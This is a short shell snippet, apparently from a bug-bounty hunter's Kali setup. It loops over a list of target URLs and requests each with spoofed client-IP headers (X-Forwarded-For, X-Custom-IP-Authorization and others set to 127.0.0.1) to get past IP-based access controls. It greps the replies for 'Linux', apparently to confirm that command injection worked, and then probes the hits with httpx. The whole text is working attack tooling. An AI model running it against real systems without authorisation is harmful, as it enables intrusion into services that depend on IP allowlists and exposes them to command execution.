for D in $(cat checkCI0.txt); do curl -sk -H 'User-Agent: Mozilla Firefox Mozilla/5.0 ---- HackerOne ---- Bug Bounty Platform' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded: 127.0.0.1' -H 'Forwarded-For: 127.0.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-ProxyUser-Ip: 127.0.0.1' -H 'X-Original-URL: 127.0.0.1' -H 'Client-IP: 127.0.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'Cluster-Client-IP: 127.0.0.1' -H 'X-ProxyUser-Ip: 127.0.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' "$D" | grep -q "Linux" && echo "$D" >> check0.txt; done;
/home/kali/bounty/httpx -l check0.txt -mc 200 -fl 0 -H 'User-Agent: Mozilla Firefox Mozilla/5.0 ---- HackerOne ---- Bug Bounty Platform' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded: 127.0.0.1' -H 'Forwarded-For: 127.0.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-ProxyUser-Ip: 127.0.0.1' -H 'X-Original-URL: 127.0.0.1' -H 'Client-IP: 127.0.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'Cluster-Client-IP: 127.0.0.1' -H 'X-ProxyUser-Ip: 127.0.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' -o checkCI.txt

